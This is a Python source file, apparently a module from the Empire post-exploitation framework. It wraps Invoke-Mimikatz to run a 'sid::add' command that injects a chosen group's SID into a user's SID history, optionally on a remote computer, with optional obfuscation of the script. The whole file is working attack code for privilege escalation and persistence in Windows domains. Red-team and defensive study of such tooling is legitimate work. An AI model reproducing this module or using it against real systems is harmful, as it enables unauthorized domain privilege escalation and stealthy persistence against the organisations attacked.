from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        # build the custom command with whatever options we want
        command = f'"sid::add /sam:{params["User"]} /new:{params["Group"]}"'
        command = f"-Command '{command}'"
        if params.get("ComputerName"):
            command = f'{command} -ComputerName "{params["ComputerName"]}"'
        # base64 encode the command to pass to Invoke-Mimikatz
        script_end = f"Invoke-Mimikatz {command};"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
